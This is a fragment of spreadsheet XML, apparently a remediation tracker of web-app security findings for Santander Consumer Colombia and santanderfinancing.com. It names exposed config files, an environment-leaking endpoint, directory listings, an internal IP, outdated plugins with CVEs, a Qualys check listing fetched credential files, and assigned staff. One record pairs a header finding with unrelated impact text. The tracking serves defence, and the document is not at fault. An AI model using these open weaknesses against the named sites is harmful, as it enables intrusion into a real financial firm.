    <s v="https://www.santanderfinancing.com/wp-content/_x000a_https://www.santanderfinancing.com/wp-includes/"/>
    <m/>
    <m/>
    <d v="2025-07-07T00:00:00"/>
    <n v="351"/>
    <d v="2025-11-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad de enumeración de directorios ocurre cuando un servidor web permite ver el contenido de directorios, exponiendo archivos sensibles. Esto facilita a los atacantes identificar recursos importantes, como configuraciones o scripts vulnerables. La prevención incluye deshabilitar el listado de directorios y proteger archivos con permisos adecuados."/>
    <s v="Se recomienda evitar la lista de directorios por motivos de seguridad._x000a_-Nginx_x000a_Dependiendo de la versión de Nginx, es necesario modificar el archivo nginx.conf. Una_x000a_configuración segura para el directorio solicitado debería ser similar a la siguiente:_x000a_ubicación /{TU DIRECTORIO} {_x000a_ autoindexación desactivada;_x000a_}_x000a_Luego, configure el servidor web para no permitir solicitudes de listado de directorios._x000a_También se recomienda asegurarse de que se hayan aplicado los últimos parches de seguridad al_x000a_servidor web y que se esté utilizando la versión estable actual del software._x000a_Para obtener más información, consulte la siguiente URL:_x000a_http://nginx.org/en/docs/http/ngx_http_autoindex_module.html_x000a_-Apache_x000a_Dependiendo de la versión de Apache, es necesario modificar el archivo httpd.conf o .htaccess:_x000a_&lt;Directorio /var/www/html&gt;_x000a_ Opciones -Índices_x000a_&lt;/Directorio&gt;"/>
    <s v="Dependiendo del tipo de información que contengan los ficheros incluídos en los directorios podría tener un mayor o menor en el impacto de la confidencialidad de los datos. Un atacante podría utilizar la información encontrada para realizar posteriormente un ataque dirigido."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="261"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <m/>
    <s v="SCO-25-CNMPA-007-CO-006"/>
    <x v="64"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/"/>
    <m/>
    <m/>
    <d v="2025-07-07T00:00:00"/>
    <n v="351"/>
    <d v="2025-11-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Cross-Origin-Embedder-Policy. Esta cabecera impide que un documento cargue cualquier recurso de “cross-origin” que no conceda explícitamente permiso al documento (mediante CORP o CORS)."/>
    <s v="Sin esta cabecera, la aplicación permite la carga de recursos de origen cruzado sin las protecciones_x000a_necesarias. Esto impide que el sitio se ejecute en un contexto completamente aislado, lo cual es un_x000a_requisito para ciertas funciones seguras como el uso compartido de memoria (SharedArrayBuffer)._x000a_También puede facilitar ataques de canal lateral o filtrado de datos mediante contenido embebido_x000a_de terceros"/>
    <s v="Implementar la cabecera Cross-Origin-Embedder-Policy con una directiva adecuada que asegure_x000a_un entorno de ejecución aislado y controlado, limitando la carga de recursos de terceros sin_x000a_permisos explícitos. Esto refuerza la seguridad del contexto de ejecución en el navegador."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="262"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <m/>
    <s v="SCO-25-CNMPA-007-CO-007"/>
    <x v="65"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/"/>
    <m/>
    <m/>
    <d v="2025-07-07T00:00:00"/>
    <n v="351"/>
    <d v="2025-11-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Cross-Origin-Resource-Policy. Esta cabecera permite controlar el conjunto de orígenes que están autorizados a incluir un recurso. Es una defensa sólida contra ataques como Spectre, ya que permite a los navegadores bloquear una respuesta determinada antes de que entre en el proceso de un atacante"/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de sidechannel, así como los ataques de Cross-Site Scripting._x000a_Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="Se recomienda establecer la cabecera Cross-Origin-Resource-Policy para controlar desde qué_x000a_orígenes pueden cargarse los recursos, limitando el acceso solo a los necesarios y protegiendo_x000a_contra el uso indebido desde otros sitios. Esto ayuda a reducir la exposición del contenido a_x000a_entornos no confiables."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="263"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <m/>
    <s v="SCO-25-CNMPA-007-CO-008"/>
    <x v="66"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/"/>
    <m/>
    <m/>
    <d v="2025-07-07T00:00:00"/>
    <n v="351"/>
    <d v="2025-11-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la  cabecera Cross-Origin-Opener-Policy. La cabecera Cross-Origin-Opener-Policy te permite separar el contexto de navegación de un documento principal de otros documentos con un origen diferente."/>
    <s v="Revisar la lógica de la aplicación de las operaciones que presentan este tipo de problemática, con_x000a_el objetivo de optimizar las mismas, para que puedan consumir la menor cantidad de recursos_x000a_posible en ser procesadas. Adicionalmente, se recomienda dimensionar las plataformas que_x000a_intervienen en el funcionamiento de la aplicación acorde a las necesidades de rendimiento y/o_x000a_tiempos de respuesta requeridos para las operaciones."/>
    <s v="Un atacante podría automatizar la ejecución de la funcionalidad afectada con la finalidad de aumentar el tiempo de respuesta de la aplicación de manera global. Impactando directamente en la disponibilidad de la misma llegando, en algunos casos, a impedir que la aplicación o ciertas_x000a_operaciones puedan estar disponibles para los usuarios legítimos. "/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="264"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-6e89f0d2-3b83-4a0f-8a2e-a932cd1bcae0"/>
    <m/>
    <x v="99"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/hsstatic/cos-i18n/static-1.53/squidGuard.conf.template"/>
    <m/>
    <m/>
    <d v="2025-07-12T00:00:00"/>
    <n v="346"/>
    <d v="2025-10-10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s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="265"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-d1208c14-c2e5-4f0d-a452-91016e59eec5"/>
    <m/>
    <x v="99"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/hsstatic/HubspotToolsMenu/squidGuard.conf.template"/>
    <m/>
    <m/>
    <d v="2025-06-28T00:00:00"/>
    <n v="360"/>
    <d v="2025-09-26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s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="266"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-c09e0c4d-b0dc-47c2-a35e-10d870ad296c"/>
    <m/>
    <x v="99"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/hsstatic/squidGuard.conf.template"/>
    <m/>
    <m/>
    <d v="2025-07-18T00:00:00"/>
    <n v="340"/>
    <d v="2025-10-16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s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="267"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-88e6a6e7-965f-49a4-a0a3-1261d76cd21b"/>
    <m/>
    <x v="99"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/squidGuard.conf"/>
    <m/>
    <m/>
    <d v="2025-07-12T00:00:00"/>
    <n v="346"/>
    <d v="2025-10-10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s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="268"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-effe1295-5afc-42b4-b337-1789dfd9f9b4"/>
    <m/>
    <x v="99"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/squidGuard.conf.template"/>
    <m/>
    <m/>
    <d v="2025-07-18T00:00:00"/>
    <n v="340"/>
    <d v="2025-10-16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s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="269"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="prospera "/>
    <s v="QA-WAS-f1b8b665-1c14-4b2e-af00-6327757c2f7d"/>
    <m/>
    <x v="110"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Martha Sanchez Sanchez"/>
  </r>
  <r>
    <n v="270"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="prospera "/>
    <s v="QA-WAS-448ad1ff-ef9f-435f-a0bb-4ebf5fd1dd2b"/>
    <m/>
    <x v="94"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Martha Sanchez Sanchez"/>
  </r>
  <r>
    <n v="271"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-cf7c0b7f-a040-4bf9-8f79-804df5af6167"/>
    <m/>
    <x v="99"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/scriptloader/squidGuard.conf.template"/>
    <m/>
    <m/>
    <d v="2025-03-08T00:00:00"/>
    <n v="472"/>
    <d v="2025-06-06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s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="272"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-63a0cc86-8b92-41b5-bd16-3ecf11e3951e"/>
    <m/>
    <x v="111"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/"/>
    <m/>
    <m/>
    <d v="2025-08-02T00:00:00"/>
    <n v="325"/>
    <d v="2025-10-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="273"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-c6c55687-a92d-46dd-98d5-b2cc5b0cd4fb"/>
    <m/>
    <x v="112"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/"/>
    <m/>
    <m/>
    <d v="2025-08-02T00:00:00"/>
    <n v="325"/>
    <d v="2025-10-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="274"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-acdfaa8f-9a8b-4387-8e78-9123f7015196"/>
    <m/>
    <x v="113"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/2025/07/"/>
    <m/>
    <m/>
    <d v="2025-07-26T00:00:00"/>
    <n v="332"/>
    <d v="2025-10-24T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The Web server presents a directory listing."/>
    <s v="The presence of a browseable directory does not necessarily imply a vulnerability. Determine if the directory listing is intended to be displayed. Verify that no files in the directory contain content that should not be served by the Web application."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="275"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-ddd76362-c445-48cc-96a0-22297f7d3868"/>
    <m/>
    <x v="114"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/hsstatic/cos-i18n/static-1.53/squidGuard.conf"/>
    <m/>
    <m/>
    <d v="2025-06-14T00:00:00"/>
    <n v="374"/>
    <d v="2025-09-12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s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="276"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-255a5e01-2c22-47fc-9253-318974a713cc"/>
    <m/>
    <x v="114"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/hsstatic/squidGuard.conf"/>
    <m/>
    <m/>
    <d v="2025-07-05T00:00:00"/>
    <n v="353"/>
    <d v="2025-10-03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s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="277"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-835d5b21-4b3d-40f1-93ea-e15aafce6b9e"/>
    <m/>
    <x v="114"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/scriptloader/squidGuard.conf"/>
    <m/>
    <m/>
    <d v="2025-06-14T00:00:00"/>
    <n v="374"/>
    <d v="2025-09-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A potentially sensitive file was discovered on the Web server. This file may or may not be directly associated with the web application. _x000a_Files Checked:_x000a_nginx.conf, .htpasswd, key.pem, certificate.pem_x000a_QID Detection Logic:_x000a_This QID sends a GET request to the target server to retrieve the file content."/>
    <s v="Verify that access to this file is permitted. If necessary, remove it or apply access controls to it."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="278"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-d3aa81a2-fe18-4d64-abcf-11eee0519096"/>
    <m/>
    <x v="111"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/"/>
    <m/>
    <m/>
    <d v="2025-08-01T00:00:00"/>
    <n v="326"/>
    <d v="2025-10-30T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="279"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-f74a856d-773e-43e5-8782-b805c9eeec64"/>
    <m/>
    <x v="112"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/"/>
    <m/>
    <m/>
    <d v="2025-08-01T00:00:00"/>
    <n v="326"/>
    <d v="2025-10-30T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="280"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-27223593-7079-4e74-9641-b96f596df73b"/>
    <m/>
    <x v="115"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/not-found/index.html"/>
    <m/>
    <m/>
    <d v="2025-08-28T00:00:00"/>
    <n v="299"/>
    <d v="2025-11-26T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A potentially sensitive file, directory, or directory listing was discovered on the Web server."/>
    <s v="Verify that access to this file or directory is permitted. If necessary, remove it or apply access controls to it."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="281"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Proyecto Portal Consumer"/>
    <m/>
    <s v="CBD-25-CNMPO-008-AP-001"/>
    <x v="116"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.8"/>
    <m/>
    <m/>
    <s v="181.57.221.233"/>
    <m/>
    <m/>
    <d v="2025-09-25T00:00:00"/>
    <n v="271"/>
    <d v="2025-12-24T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Ciertos tipos de ficheros, como imágenes, PDFs o documentos de Microsoft Office almacenan  información en forma de metadatos, tales como autor, fecha de creación, nombre de equipo,  direccionamiento IP o tecnologías utilizadas. La aplicación web analizada alberga uno o más ficheros que contienen metadatos y que pueden  Proporcionar información interna de la organización, tales  como nombres de empleados, códigos de usuario o versiones de software."/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos _x000a_generados y/o publicados en la aplicación. De manera adicional se puede implementar un _x000a_procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los _x000a_mismos no contengan información sensible de la organización en sus metadatos"/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos _x000a_generados y/o publicados en la aplicación. De manera adicional se puede implementar un _x000a_procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los _x000a_mismos no contengan información sensible de la organización en sus metadatos"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="282"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Proyecto Portal Consumer"/>
    <m/>
    <s v="CBD-25-CNMPO-008-AP-002"/>
    <x v="117"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.8"/>
    <m/>
    <m/>
    <s v="181.57.221.233"/>
    <m/>
    <m/>
    <d v="2025-09-25T00:00:00"/>
    <n v="271"/>
    <d v="2025-12-24T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Esta versión, adicionalmente, tiene vulnerabilidades conocidas: CVE-2023-44487"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al tipo de servidor _x000a_y versión utilizado para alojar la propia aplicación. Para ello es necesario eliminar las cabeceras de _x000a_respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información."/>
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite _x000a_a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así _x000a_como generar ataques más elaborados contra la plataforma"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="283"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-68e67253c27f315eb11ba7f2"/>
    <s v="SCO-25-CNMPA-008-CO-002 "/>
    <x v="10"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2025-10-08T00:00:00"/>
    <n v="258"/>
    <d v="2026-01-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   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DETALLE   SCO-25-CNMPA-008-CO-002:   A través del endpoint, identificado https://santanderfinancing.com/cgi-bin/printenv.pl es posible enumerar información sobre el equipo, el servidor y la aplicación del backend. Se muestran a continuación las evidencias:      Figura 1 - Listado de variables de entorno del servidor remoto (1/2)      Figura 2 - Listado de variables de entorno del servidor remoto (2/2)   Se enumeran dos direcciones IP’s que deben pertenecer al servicio web tras el WAF o el balanceador ya que no coincide con la IP de resolución del nombre. Se ha intentado acceder y analizar estas IP’s pero parece que el tráfico externo está bloqueado correctamente.   RIESGO   Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma."/>
    <s v="  RECOMENDACIÓN   Se recomienda evitar que la aplicación devuelva al usuario información relativa al tipo de servidor y versión utilizado para alojar la propia aplicación. Para ello es necesario eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="284"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-68e67203c27f315eb11ba7f1"/>
    <s v="SCO-25-CNMPA-008-VE-001 "/>
    <x v="11"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="6.4"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2025-10-08T00:00:00"/>
    <n v="258"/>
    <d v="2026-01-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   Durante la realización de las pruebas se ha podido comprobar que el activo afectado hace uso de cierta versión de software que presenta vulnerabilidades conocidas y divulgadas públicamente.   DETALLE   SCO-25-CNMPA-008-VE-001:   Se ha detectado que el activo afectado localizado en https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/dist/styles/gdpr-main-nf.css?ver=4.16.1 posee una versión de gdpr-cookie-compliance con vulnerabilidades públicas asociadas.   A continuación se muestra como el software vulnerable se encuentra en uso.                 Los detalles de la vulnerabilidad pública de esta versión del software se pueden consultar en los siguientes enlaces:    https://wpscan.com/vulnerability/c30b9631-2024-4081-9cc5-8294a77c5ebb/   - El CVE asociado es CVE-2025-1621 con una criticidad baja que permite implementar un XSS de forma postautenticada con permisos elevados.      https://httpd.apache.org/security/vulnerabilities_24.html   https://wpscan.com/vulnerability/c30b9631-2024-4081-9cc5-8294a77c5ebb/       RIESGO   El software sin actualizar puede incurrir en el riesgo de ser comprometido mediante vulnerabilidades conocidas, lo cual puede poner en riesgo al activo afectado."/>
    <s v="  RECOMENDACIÓN   Se recomienda actualizar la versión del plugin gdpr-cookie-compliance y establecer una política de actualizaciones/gestión de parches para tratar de evitar posteriores vulnerabilidades."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="285"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <m/>
    <s v="SCO-25-CNMPO-011-VE-001"/>
    <x v="50"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="bpm.santanderconsumer.co/OriginacionPROD/"/>
    <m/>
    <m/>
    <d v="2025-10-21T00:00:00"/>
    <n v="245"/>
    <d v="2026-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha comprobado que la aplicación hace uso de librerías de terceros que tienen vulnerabilidades públicas asociadas."/>
    <s v="El uso de software o librerías de terceros sin actualizar puede ser comprometido mediante _x000a_vulnerabilidades conocidas poniendo en riesgo el activo afectado."/>
    <s v="Se recomienda actualizar la versión de jQuery y DOMPurify y establecer una política de _x000a_actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. _x000a_La últimas versiónes de jQuery y DOMPurify puede ser descargadas desde la siguientes direcciónes_x000a_URL: _x000a_• jQuery: https://jquery.com/download_x000a_• DOMPurify: https://github.com/cure53/DOMPurif"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Alexander Parra"/>
  </r>
  <r>
    <n v="286"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <m/>
    <s v="SCO-25-CNMPO-011-AP-002"/>
    <x v="118"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.1"/>
    <m/>
    <m/>
    <s v="bpm.santanderconsumer.co/OriginacionPROD/"/>
    <m/>
    <m/>
    <d v="2025-10-21T00:00:00"/>
    <n v="245"/>
    <d v="2026-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor afectado puede realizar consultas sobre servidores DNS externos. Para ello un atacante necesita forzar al servidor a realizar una consulta a un dominio controlado por el propio atacante.Esta consulta se puede forzar de varias maneras como, por ejemplo, forzando al aplicativo a solicitar un recurso en el dominio controlado por el atacante."/>
    <s v="Se recomienda, en caso de no ser necesario, deshabilitar la configuración del servidor para que no _x000a_se le permita realizar consultas DNS a un servidor externo. En su lugar configurar el servidor _x000a_afectado para que utilice un servidor DNS interno o de la DMZ."/>
